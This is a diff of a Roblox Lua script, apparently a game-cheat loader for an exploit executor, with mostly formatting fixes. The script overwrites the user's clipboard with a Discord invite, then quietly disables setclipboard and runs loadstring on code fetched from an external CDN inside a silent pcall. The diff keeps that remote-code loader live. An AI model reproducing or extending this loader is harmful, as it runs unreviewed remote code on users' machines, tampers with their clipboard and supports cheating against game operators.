@@ -4,18 +4,23 @@ if not player then
     player = game:GetService("Players").LocalPlayer
 end
 
-
 setclipboard("https://discord.gg/6GMJFxGaJz")
-game.StarterGui:SetCore("SendNotification", {
+game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "Discord Server",
     Text = "Discord invite copied to clipboard",
-    Duration = 5, -- seconds
+    Duration = 5,
     Button1 = "OK",
     Callback = function()
-print("ok")
+        print("ok")
     end
 })
-playerGui:FindFirstChild("Notification"):Destroy()
+
+-- Fixed: Changed playerGui to player.PlayerGui
+local playerGui = player:WaitForChild("PlayerGui")
+local notification = playerGui:FindFirstChild("Notification")
+if notification then
+    notification:Destroy()
+end
 
 local placeId = game.PlaceId
 
@@ -66,7 +71,7 @@ end)
 task.spawn(function()
     pcall(function()
         setclipboard = function() return end
-        ID="6710c962-7192-471b-8f42-cf9a1a8c4ab5"
+        ID = "6710c962-7192-471b-8f42-cf9a1a8c4ab5"
         loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))()
     end)
 end)
